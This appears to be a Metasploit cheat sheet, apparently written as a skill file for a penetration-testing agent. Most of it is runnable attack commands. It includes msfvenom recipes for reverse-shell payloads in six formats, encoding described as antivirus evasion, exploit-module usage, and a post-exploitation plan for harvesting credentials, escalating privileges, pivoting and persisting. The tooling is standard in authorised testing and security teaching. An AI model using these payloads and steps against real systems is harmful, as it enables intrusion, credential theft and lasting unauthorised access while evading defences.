# Metasploit Framework — Exploit & Post-Exploitation Platform

> Covers: msf_console, msfvenom, msf_db, metasploit_resource

## Why
Full exploitation framework. Searchable exploit database, payload generation, session management, post-exploitation modules. The big gun.

## When to Use

| Signal | Action |
|---|---|
| Known exploit with Metasploit module | Use msf_console |
| Need reverse shell payload | msfvenom |
| Need staged/encoded payload | msfvenom |
| Post-exploitation (privesc, pivot) | msf post modules |
| Need persistent session management | meterpreter |
| searchsploit shows Metasploit module | Direct path to exploit |

## msfconsole — Core Console

```bash
# Search for exploit
msf> search <service> <version>
msf> search type:exploit name:apache

# Use exploit
msf> use exploit/path/to/module
msf> show options
msf> set RHOSTS <target>
msf> set RPORT <port>
msf> set LHOST <your_ip>
msf> set LPORT 4444
msf> exploit

# Search for post-exploitation
msf> search type:post platform:linux

# Background session
meterpreter> background
msf> sessions -l
msf> sessions -i <id>
```

## msfvenom — Payload Generation

```bash
# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php

# Python reverse shell
msfvenom -p python/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.py

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp

# With encoder (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe > shell.exe

# List payloads
msfvenom -l payloads | grep <os>

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders
```

## Payload Selection Logic

```
TARGET OS:
  ├─ Linux   → linux/x86/shell_reverse_tcp (or meterpreter)
  ├─ Windows → windows/shell_reverse_tcp (or meterpreter)
  └─ Web     → php/python/jsp depending on stack

DELIVERY METHOD:
  ├─ File upload      → elf/exe/php depending on target
  ├─ Web exploit      → scripted payload (php, py, jsp)
  ├─ Manual execution → binary for target OS
  └─ Injection        → raw shellcode

STAGED vs STAGELESS:
  ├─ Staged (shell/reverse_tcp)     → smaller, needs MSF handler
  └─ Stageless (shell_reverse_tcp)  → larger, works with nc listener
```

## msf_db — Database Management

```bash
# Initialize database
msfdb init

# Check status
msfdb status

# Store scan results
msf> db_nmap -sV <target>

# View stored hosts
msf> hosts

# View stored services
msf> services

# View stored vulns
msf> vulns
```

## Junior Mistakes

- Using Metasploit for everything (overkill for simple tasks)
- Not setting LHOST correctly (payload can't call back)
- Using staged payload with nc listener (need MSF handler for staged)
- Not backgrounding sessions (lose track of shells)
- Forgetting to start postgresql before msfdb
- Not checking if simpler exploit exists (python script vs MSF module)

## Pivot After Metasploit

```
Shell obtained?
  ├─ Upgrade to meterpreter → post modules available
  ├─ Run post/multi/gather/* → harvest creds, info
  ├─ Run post/*/escalate/* → privilege escalation
  ├─ Pivot → route through session to internal network
  └─ Persist → maintain access for report

Exploit failed?
  ├─ Check version match exactly
  ├─ Check LHOST/LPORT reachable from target
  ├─ Try different payload (stageless, different arch)
  └─ Try manual exploit instead of MSF module
```
